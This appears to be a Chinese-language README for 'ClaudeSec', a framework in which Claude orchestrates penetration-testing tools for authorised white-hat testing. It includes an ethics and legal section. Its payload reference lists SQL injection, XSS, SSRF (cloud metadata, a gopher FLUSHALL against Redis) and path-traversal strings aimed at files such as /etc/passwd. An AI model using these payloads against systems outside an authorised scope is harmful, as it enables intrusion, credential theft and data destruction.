# ClaudeSec — AI驱动的白帽子安全测试框架

<p align="center">
  <img src="https://img.shields.io/badge/version-2.0.0-blue.svg" alt="Version 2.0.0"/>
  <img src="https://img.shields.io/badge/license-MIT-green.svg" alt="MIT License"/>
  <img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome"/>
  <img src="https://img.shields.io/badge/platform-linux%20%7C%20wsl-lightgrey.svg" alt="Platform Linux/WSL"/>
  <img src="https://img.shields.io/badge/AI-Claude%20Opus-8A2BE2.svg" alt="AI: Claude Opus"/>
</p>

<p align="center">
  <b>ClaudeSec</b> 是一个基于 <a href="https://claude.ai">Claude AI</a> 的自动化安全测试辅助框架。<br>
  它将 AI 的分析推理能力与业界领先的安全工具链相结合，<br>
  为白帽子、安全研究员和渗透测试人员提供智能化的渗透测试工作流。
</p>

---

## 📋 目录

- [核心特性](#-核心特性)
- [架构概览](#-架构概览)
- [快速开始](#-快速开始)
- [工具链依赖](#-工具链依赖)
- [命令参考](#-命令参考)
- [工作流详解](#-工作流详解)
- [检测规则库](#-检测规则库)
- [Payload 参考](#-payload-参考)
- [报告模板](#-报告模板)
- [最佳实践](#-最佳实践)
- [伦理与法律](#-伦理与法律)
- [常见问题](#-常见问题)

---

## 🚀 核心特性

| 特性 | 说明 |
|------|------|
| **🧠 AI 驱动分析** | Claude 自动解析工具输出，提取攻击面、分析漏洞、过滤误报、构建攻击链 |
| **🔧 全工具链集成** | 子域名枚举 → 端口扫描 → 指纹识别 → 目录爆破 → JS分析 → 漏洞验证 全流程自动化 |
| **📊 智能优先级** | AI 自动对发现进行优先级排序，推荐最佳利用路径 |
| **🎯 多维度检测** | 信息泄露、逻辑漏洞、注入攻击、配置缺陷全覆盖 |
| **📝 报告自动生成** | 测试完成后自动输出结构化渗透测试报告 |
| **🔌 可扩展架构** | 支持自定义 payload、字典、检测规则 |

---

## 🏗 架构概览

```
用户输入 (/recon /scan /check)
        │
        ▼
┌─────────────────────────────────────┐
│         Claude AI 编排引擎          │
│  ┌─────────────────────────────┐   │
│  │  任务规划 ─ 指令分解        │   │
│  │  工具调度 ─ 按序执行工具    │   │
│  │  结果分析 ─ 解析原始输出    │   │
│  │  决策推理 ─ 自适应下一步    │   │
│  └─────────────────────────────┘   │
└─────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│         安全工具执行层              │
│                                      │
│  subfinder → nmap → whatweb → ffuf  │
│       ↓        ↓        ↓       ↓   │
│  子域名    端口扫描  指纹识别  目录枚举 │
│                                      │
│  ───── 第二阶段 ─────               │
│                                      │
│  SQLMap → XSStrike → jwt_tool → ... │
│       ↓        ↓         ↓       ↓   │
│  SQL注入    XSS检测   JWT攻击 其他漏洞│
└─────────────────────────────────────┘
        │
        ▼
┌─────────────────────────────────────┐
│        AI 后处理 & 报告生成         │
│                                      │
│  误报过滤 → 漏洞聚合 → 优先级排序     │
│  → 攻击链构建 → 报告输出             │
└─────────────────────────────────────┘
```

---

## ⚡ 快速开始

### 前置要求

- **操作系统**: Linux / WSL2 (Windows Subsystem for Linux)
- **Claude Code**: 已安装并配置好 API 访问
- **Python 3.8+**: 部分工具依赖
- **Go 1.18+**: 部分Go语言工具需要
- **sudo 权限**: 安装系统级工具

### 一键安装

```bash
# 下载并运行安装脚本
curl -fsSL https://raw.githubusercontent.com/your/ClaudeSec/main/scripts/install.sh | bash

# 或克隆后本地安装
git clone https://github.com/your/ClaudeSec.git
cd ClaudeSec
chmod +x scripts/install.sh
./scripts/install.sh
```

### 手动安装

```bash
# 1. 系统级工具
sudo apt update
sudo apt install -y nmap whatweb dirsearch curl wget git python3-pip

# 2. Go 工具（需先安装 Go）
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# 3. Python 工具
pip3 install arjun uro httpx beautifulsoup4

# 4. 确保 Go 二进制在 PATH 中
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
source ~/.bashrc
```

### 验证安装

```bash
# 验证核心工具
nmap --version | head -1
whatweb --version | head -1
subfinder -version
ffuf -V | head -1
```

---

## 📦 工具链依赖

### 核心工具

| 工具 | 版本要求 | 用途 | 安装方式 |
|------|---------|------|---------|
| [nmap](https://nmap.org) | ≥ 7.80 | 端口扫描、服务识别、脚本扫描 | `apt install nmap` |
| [subfinder](https://github.com/projectdiscovery/subfinder) | ≥ 2.5.0 | 被动子域名枚举 | `go install` |
| [ffuf](https://github.com/ffuf/ffuf) | ≥ 2.0.0 | 高速目录/参数 fuzzing | `go install` |
| [whatweb](https://github.com/urbanadventurer/WhatWeb) | ≥ 0.5.5 | Web 指纹识别 | `apt install whatweb` |
| [dirsearch](https://github.com/maurosoria/dirsearch) | ≥ 0.4.3 | 目录暴力枚举 | `apt install dirsearch` |

### 增强工具（可选但推荐）

| 工具 | 用途 | 安装方式 |
|------|------|---------|
| [httpx](https://github.com/projectdiscovery/httpx) | HTTP 探活、响应分析 | `go install` |
| [naabu](https://github.com/projectdiscovery/naabu) | 快速端口扫描 | `go install` |
| [hakrawler](https://github.com/hakluke/hakrawler) | Web 爬虫、JS URL 提取 | `go install` |
| [waybackurls](https://github.com/tomnomnom/waybackurls) | 历史 URL 提取 | `go install` |
| [gf](https://github.com/tomnomnom/gf) | grep 模式匹配 | `go install` |
| [arjun](https://github.com/s0md3v/Arjun) | 参数发现 | `pip3 install arjun` |
| [gau](https://github.com/lc/gau) | 多渠道 URL 聚合 | `go install` |

### 漏洞专项工具

| 工具 | 用途 | 安装方式 |
|------|------|---------|
| [SQLMap](https://github.com/sqlmapproject/sqlmap) | SQL 注入自动检测利用 | `apt install sqlmap` |
| [XSStrike](https://github.com/s0md3v/XSStrike) | XSS 检测 | `git clone` + `pip3 install` |
| [jwt_tool](https://github.com/ticarpi/jwt_tool) | JWT 安全检测 | `git clone` + `pip3 install` |
| [GitDumper](https://github.com/arthaud/git-dumper) | .git 泄露恢复 | `pip3 install git-dumper` |

---

## 📖 命令参考

### /recon — 信息收集

**功能**: 全自动多阶段信息收集，覆盖目标资产发现的各个维度。

**用法**: `/recon <target>`

```
/recon example.com
/recon 192.168.1.1
/recon https://target.com
```

**执行流程**:

```
阶段 1: 资产枚举
  ├─ 子域名收集 (subfinder → 去重 → 探活)
  ├─ DNS 记录分析 (A / CNAME / MX / TXT)
  ├─ 历史 URL 提取 (waybackurls / gau)
  └─ CDN 识别与真实 IP 溯源

阶段 2: 网络探测
  ├─ 快速端口扫描 (naabu / nmap -T4)
  ├─ 详细服务识别 (nmap -sC -sV)
  └─ 操作系统指纹识别

阶段 3: Web 指纹
  ├─ CMS / 框架 / 语言识别 (whatweb)
  ├─ WAF 检测 (wafw00f)
  ├─ 中间件版本探测
  └─ HTTP 响应头分析

阶段 4: 目录枚举
  ├─ 敏感路径爆破 (ffuf / dirsearch)
  ├─ 备份文件探测
  ├─ API 端点发现
  └─ 管理后台入口定位

阶段 5: JS 分析
  ├─ JS 文件提取与爬取 (hakrawler)
  ├─ API 接口正则提取
  ├─ 硬编码密钥/Token 搜索
  └─ 前端鉴权逻辑分析

阶段 6: AI 汇总
  ├─ 攻击面结构化输出
  ├─ 漏洞可能性评估
  ├─ 推荐下一步测试方向
  └─ 攻击路径图谱
```

### /scan — 漏洞扫描

**功能**: 多维度自动化漏洞探测，覆盖 OWASP Top 10 及常见业务逻辑漏洞。

**用法**: `/scan <target>`

```
/scan example.com
/scan https://target.com/api
/scan 10.10.10.10
```

**检测矩阵**:

| 漏洞大类 | 检测项 | 检测方式 | 优先级 |
|---------|--------|---------|-------|
| 信息泄露 | .git 泄露 | git-dumper 恢复验证 | 🔴 高 |
| 信息泄露 | .env / 敏感配置文件 | 目录枚举 + 内容检查 | 🔴 高 |
| 信息泄露 | Swagger / API 文档 | 路径枚举 + 响应分析 | 🔴 高 |
| 信息泄露 | 源文件/备份文件 | 扩展名枚举 (.bak .zip .tar) | 🟡 中 |
| 信息泄露 | JS 硬编码密钥 | 正则匹配 (AK/SK/JWT/APIKey) | 🔴 高 |
| 逻辑漏洞 | IDOR 越权 | 参数遍历 + Cookie 替换 | 🔴 高 |
| 逻辑漏洞 | 未授权访问 | 头信息移除 + 直接访问 | 🔴 高 |
| 逻辑漏洞 | 支付篡改 | 负数/小数/精度攻击 | 🟡 中 |
| 逻辑漏洞 | JWT 攻击 | alg=none / 弱密钥 / kid 注入 | 🟡 中 |
| 注入攻击 | SQL 注入 | 报错/时间/布尔盲注 | 🔴 高 |
| 注入攻击 | XSS | 存储型/反射型/DOM 型 | 🟡 中 |
| 注入攻击 | SSTI | 模板语法测试 | 🟡 中 |
| 注入攻击 | SSRF | 内网 IP / 云元数据 | 🟡 中 |
| 注入攻击 | LFI/RFI | 路径遍历 + 文件包含 | 🟡 中 |
| 文件安全 | 任意文件上传 | 类型/后缀/内容绕过 | 🔴 高 |
| 文件安全 | 任意文件下载 | 路径穿越检测 | 🔴 高 |
| 配置缺陷 | CORS 配置 | Origin 反射测试 | 🟢 低 |
| 配置缺陷 | HTTPS 配置 | 协议/证书/ HSTS | 🟢 低 |
| 配置缺陷 | 弱口令 | 常见弱口令字典 | 🟡 中 |

### /attack-surface — 攻击面分析

**功能**: 综合分析目标暴露面，输出攻击路径图谱。

**用法**: `/attack-surface <target>`

```
/attack-surface example.com
```

**输出内容**:
- 暴露端口及对应服务
- Web 应用指纹及已知漏洞
- 敏感目录和泄露文件
- 子域名及关联资产
- 推荐的攻击路径（排序后）
- 预计利用难度评估

### /check — 单点检测

**功能**: 对指定 URL 进行快速定向检测。

**用法**: `/check <url>`

```
/check https://target.com/api/user?id=1
/check https://target.com/login
/check https://target.com/upload
```

**检测内容**:
- 未授权访问（移除认证头后请求）
- SQL 注入（参数注入 + 响应分析）
- XSS（反射型快速验证）
- 路径遍历（../ 注入）
- 敏感信息泄露（响应内容分析）

### /report — 生成报告

**功能**: 汇总当前会话的所有发现，输出结构化渗透测试报告。

**用法**: `/report`

**报告结构**:

```
📄 安全测试报告
├── 基本信息（目标 / 时间 / 范围）
├── 执行摘要（管理层概述）
├── 高危漏洞（CVSS ≥ 7.0）
│   ├── 漏洞描述
│   ├── 复现步骤（含请求/响应）
│   ├── 影响评估
│   └── 修复建议
├── 中危漏洞（CVSS 4.0 - 6.9）
├── 低危漏洞（CVSS < 4.0）
├── 信息类发现
├── 攻击链分析
├── 加固建议
└── 附录（原始数据 / 工具输出）
```

---

## 🔬 工作流详解

### 信息收集阶段 — 深度执行策略

#### 1. 子域名枚举策略

```
┌─ Passive（被动，不产生直接请求）
│   ├── subfinder — 调用 30+ 数据源（Virustotal、SecurityTrails等）
│   ├── waybackurls — 从 Wayback Machine 提取历史 URL
│   ├── crt.sh — 证书透明度日志查询
│   └── rapiddns.io — DNS 聚合查询
│
└─ Active（主动，产生 DNS 请求）
    ├── 泛解析检测
    ├── DNS 区域传输尝试
    └── 常见子域名爆破（top 10000 字典）
```

#### 2. 端口扫描策略

```bash
# 阶段 1: 快速全端口扫描（识别开放端口）
nmap -sS -T4 --min-rate=10000 -p- <target> -oN ports.txt

# 阶段 2: 详细服务识别（仅扫描开放端口）
nmap -sC -sV -O -T4 -p <PORT_LIST> <target> -oN services.txt

# 阶段 3: NSE 漏洞脚本扫描（针对特定服务）
nmap --script vuln -p <PORT_LIST> <target> -oN vuln.txt
```

#### 3. 目录枚举字典优先级

```
优先级 1: 敏感配置类
  /.git/config, /.env, /admin/.env, /config.php, /db.config

优先级 2: API 文档类
  /swagger/, /api/docs, /v1/swagger.json, /openapi.json

优先级 3: 后台入口
  /admin, /manager, /dashboard, /wp-admin, /administrator

优先级 4: 备份文件
  /www.zip, /backup.tar, /db.sql, /.gitignore, /dump.sql

优先级 5: 路径遍历
  /../../etc/passwd, /..;/..;/etc/passwd
```

### 漏洞验证阶段 — 判定规则

#### SQL 注入判定

```python
# AI 分析的响应特征
INDICATORS = {
    "error_based": {
        # MySQL
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        # MSSQL
        "unclosed quotation mark",
        "microsoft ole db",
        # Oracle
        "ora-[0-9]{5}",
        # PostgreSQL
        "psql error",
        "pg_query",
    },
    "time_based": {
        "SLEEP(5)": "响应延迟 ≥ 5 秒",
        "BENCHMARK()": "响应延迟异常",
        "pg_sleep()": "PostgreSQL 延迟",
    },
    "boolean_based": {
        "and 1=1 vs and 1=2": "响应内容差异",
        "页面大小变化": "布尔盲注特征",
    }
}
```

#### XSS 判定

```python
# AI 分析的上下文特征
XSS_CONTEXTS = {
    "html_context": {
        "test": "<script>alert(1)</script>",
        "verification": "检查 payload 是否原样返回",
    },
    "attribute_context": {
        "test": '" onfocus="alert(1)" autofocus="',
        "verification": "检查属性是否被截断",
    },
    "js_context": {
        "test": "';alert(1);//",
        "verification": "检查 JS 字符串是否被逃逸",
    },
}
```

---

## 📚 Payload 参考

### SQL 注入检测 Payload

```
# 报错注入（MySQL）
'
"
%27
%22
\'
1' AND 1=1--
1' AND 1=2--
1' AND SLEEP(5)--
1' AND BENCHMARK(5000000, MD5('test'))--

# 时间盲注
' OR SLEEP(5)--
1' | pg_sleep(5)--
1' WAITFOR DELAY '0:0:5'--

# 联合查询
' UNION SELECT 1,2,3--
' UNION SELECT @@version,2,3--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```

### XSS 检测 Payload

```
# 标准检测
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# 属性逃逸
" onfocus=alert(1) autofocus="
' onmouseover=alert(1) '

# 无括号
<script>alert`1`</script>
<svg/onload=location=atob('amF2YXNjcmlwdDphbGVydCgxKQ==')>

# DOM 型
"><img src=x onerror=alert(1)>
</script><script>alert(1)</script>
```

### SSRF 检测 Payload

```
# 内网探测
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080

# 云元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://100.100.100.200/latest/meta-data/  # 阿里云

# 协议绕过
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

### 路径遍历检测 Payload

```
../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd  # 二次编码
../../../etc/passwd%00.jpg         # 空字节截断
```

---

## 📊 报告模板

```markdown
# 渗透测试报告

| 字段 | 内容 |
|------|------|
| 目标 | {{target}} |
| 测试时间 | {{date}} |
| 测试人员 | {{tester}} |
| 测试范围 | {{scope}} |
| 测试方法 | 黑盒/白盒/灰盒 |
| CVSS 评分 | {{overall_score}} |

---

## 1. 执行摘要

{{ 1-2 段对管理层概述，说明整体安全状况 }}

**风险统计**:
- 🔴 高危: {{high_count}} 个
- 🟡 中危: {{medium_count}} 个
- 🟢 低危: {{low_count}} 个
- ℹ️ 信息: {{info_count}} 个

---

## 2. 高危漏洞详情

### H-01: {{漏洞标题}}

- **类型**: SQL 注入 / XSS / 越权 / ...
- **位置**: {{URL}}
- **CVSS**: {{score}} (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **严重性**: 🔴 高危

**漏洞描述**:
{{ 漏洞产生的原因和可造成的危害 }}

**复现步骤**:
1. 发送请求:
```http
GET {{url}} HTTP/1.1
Host: {{host}}
Cookie: {{cookie}}
```

2. 响应分析:
```json
{{response_body}}
```

3. 验证截图: {{screenshot_reference}}

**影响评估**:
- 机密性影响: {{高/中/低}}
- 完整性影响: {{高/中/低}}
- 可用性影响: {{高/中/低}}

**修复建议**:
- {{具体修复方案}}
- {{参考链接}}

---

## 3. 中危漏洞

### M-01: ...

---

## 4. 低危漏洞

### L-01: ...

---

## 5. 攻击链分析

```
{{entry_point}} → {{exploit1}} → {{exploit2}} → {{target_asset}}
```

---

## 6. 加固建议

| 优先级 | 建议 | 对应漏洞 |
|--------|------|---------|
| P0 | ... | H-01, H-02 |
| P1 | ... | M-01 |
| P2 | ... | L-01 |

---

## 7. 附录

### 7.1 工具输出原文
### 7.2 使用的字典列表
### 7.3 请求/响应原始数据
```

---

## 💡 最佳实践

### 测试前置检查清单

- [ ] 已获得目标所有者书面授权
- [ ] 已明确测试范围和边界
- [ ] 已确认不涉及生产核心数据
- [ ] 已准备应急回退方案
- [ ] 已安装所有依赖工具

### 测试过程规范

1. **流量控制**: 扫描线程不宜过高，避免对目标造成 DoS
2. **数据保护**: 发现真实用户数据立即停止并截图取证，不下载
3. **增量测试**: 从低危到高危逐步深入，每步确认后再前进
4. **日志记录**: 完整记录所有测试操作和时间戳

### 报告编写指南

1. **漏洞描述**: 清晰说明漏洞产生的原因和上下文
2. **复现步骤**: 详细到第三方可以无损复现
3. **修复建议**: 具体可操作，附参考链接
4. **风险评级**: 使用 CVSS 3.1 标准评分
5. **攻击链**: 说明多个漏洞如何组合利用

---

## ⚖️ 伦理与法律

### 法律红线

```text
《中华人民共和国网络安全法》第二十六条:
  任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、
  窃取网络数据等危害网络安全的活动。

《刑法》第二百八十五条:
  违反国家规定，侵入国家事务、国防建设、尖端科学技术领域
  以外的计算机信息系统，处三年以下有期徒刑或者拘役。
```

### 行为准则

- ✅ **必须**获得明确授权后才进行测试
- ✅ **必须**在指定范围内进行测试
- ✅ **必须**保护测试过程中发现的用户数据
- ✅ **必须**按照 SRC/平台流程负责任披露漏洞
- ❌ **禁止**对未授权目标执行任何扫描和探测
- ❌ **禁止**拖库、下载、篡改任何用户数据
- ❌ **禁止**使用漏洞进行勒索、诈骗等违法行为
- ❌ **禁止**将漏洞用于非法交易或黑产

### 责任漏洞披露流程

```
发现漏洞 → 确认有效性 → 联系厂商 → 提供报告
→ 协商修复时间 → 公开披露（修复后）
```

---

## ❓ 常见问题

**Q: 为什么扫描结果为空？**
A: 可能原因：(1) 目标启用了 WAF (2) 网络连接问题 (3) 目标未在运行状态。建议先使用 `/recon` 确认目标可达性。

**Q: 如何添加自定义字典？**
A: 将字典文件放入 `wordlists/` 目录，在命令中通过 `-w` 参数指定。

**Q: 扫描速度太慢怎么办？**
A: 调高 nmap 的 `--min-rate` 参数，或使用 naabu 替代 nmap 做快速端口扫描。

**Q: 如何处理大量误报？**
A: AI 已自动过滤常见误报。如果仍有误报，可使用 `/report` 生成报告后手动标注。

**Q: 是否支持 Windows？**
A: 推荐使用 WSL2 (Windows Subsystem for Linux) 运行。

---

## 📄 许可证

本项目基于 MIT 许可证开源。详情请参见 [LICENSE](./LICENSE) 文件。

## 🤝 贡献

欢迎通过 Issue 和 Pull Request 贡献代码和想法。请确保你的贡献符合：

- 仅用于合法的安全测试用途
- 不包含恶意代码或后门
- 遵循安全研究最佳实践

---

<p align="center">
  <b>ClaudeSec</b> — 用 AI 让安全测试更智能<br>
  <sub>仅供授权的安全测试和学术研究使用</sub>
</p>
